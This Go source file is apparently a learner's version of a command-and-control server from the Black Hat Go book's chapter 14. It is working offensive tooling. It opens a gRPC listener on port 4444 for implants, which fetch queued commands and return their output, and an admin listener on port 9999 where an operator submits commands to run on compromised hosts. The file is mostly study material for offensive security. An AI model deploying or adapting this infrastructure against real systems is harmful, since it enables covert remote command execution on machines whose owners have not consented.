package main

import (
	"context"
	"errors"
	"log"
	"net"

	"github.com/mrchi/golang/Black-Hat-Go/ch14/grpcapi"
	"google.golang.org/grpc"
)

type implantServer struct {
	work, output chan *grpcapi.Command
	grpcapi.UnimplementedImplantServer
}

func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
	var cmd = new(grpcapi.Command)
	select {
	case cmd, ok := <-s.work: // 非阻塞
		if ok {
			return cmd, nil
		}
		return cmd, errors.New("channel closed")
	default:
		return cmd, nil
	}
}

func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	s.output <- result // 阻塞的
	return &grpcapi.Empty{}, nil
}

type adminServer struct {
	work, output chan *grpcapi.Command
	grpcapi.UnimplementedAdminServer
}

func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
	var resp *grpcapi.Command
	go func() {
		s.work <- cmd
	}()
	resp = <-s.output
	return resp, nil
}

func newImplantServer(work, output chan *grpcapi.Command) *implantServer {
	s := new(implantServer)
	s.work = work
	s.output = output
	return s
}

func newAdminServer(work, output chan *grpcapi.Command) *adminServer {
	s := new(adminServer)
	s.work = work
	s.output = output
	return s
}

func main() {
	work, output := make(chan *grpcapi.Command), make(chan *grpcapi.Command)

	implant := newImplantServer(work, output)
	admin := newAdminServer(work, output)

	var opts []grpc.ServerOption
	grpcImplantServer := grpc.NewServer(opts...)
	grpcAdminServer := grpc.NewServer(opts...)

	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
	grpcapi.RegisterAdminServer(grpcAdminServer, admin)

	implantListener, err := net.Listen("tcp", "localhost:4444")
	if err != nil {
		log.Panicln(err)
	}
	adminListener, err := net.Listen("tcp", "localhost:9999")
	if err != nil {
		log.Panicln(err)
	}

	go func() {
		grpcImplantServer.Serve(implantListener)
	}()
	grpcAdminServer.Serve(adminListener)
}
